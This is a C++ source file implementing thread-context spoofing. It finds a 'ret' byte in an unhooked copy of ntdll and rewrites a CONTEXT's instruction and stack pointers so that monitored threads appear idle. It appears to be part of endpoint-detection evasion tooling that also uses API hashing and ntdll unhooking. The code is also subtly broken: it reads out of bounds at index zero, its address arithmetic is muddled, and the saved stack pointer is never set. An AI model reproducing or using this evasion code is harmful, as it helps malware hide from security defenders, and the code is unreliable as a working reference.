#include "ContextSpoof.h"
#include "ApiHash.h"
#include "Unhook.h"

#include <windows.h>

#include <cstring>

namespace cspoof {

namespace {

std::uintptr_t g_idleRip = 0;
std::uintptr_t g_idleRsp = 0;

// Prefer a real ntdll `ret` so CONTEXT snapshots look idle.
bool find_idle() {
    auto t = unhook::clean_text();
    std::size_t sz = unhook::clean_text_size();
    if (!t || sz < 64) return false;
    for (std::size_t i = 0; i + 64 < sz; ++i) {
        if (t[i] == 0xC3 && t[i - 1] == 0xC2) { // rough: ret after pop-ish bytes
            g_idleRip = reinterpret_cast<std::uintptr_t>(unhook::loaded_ntdll_base()) +
                        unhook::clean_text() + i - t;
            return true;
        }
    }
    return false;
}

} // namespace

bool init() {
    return find_idle();
}

void spoof_context(void* ctx) {
    if (!g_idleRip || !ctx) return;
    CONTEXT* c = static_cast<CONTEXT*>(ctx);
    c->Rip = g_idleRip;
    c->Rsp = g_idleRsp;
    c->Rbp = 0;
    c->Rax = 0;
    c->ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
}

} // namespace cspoof
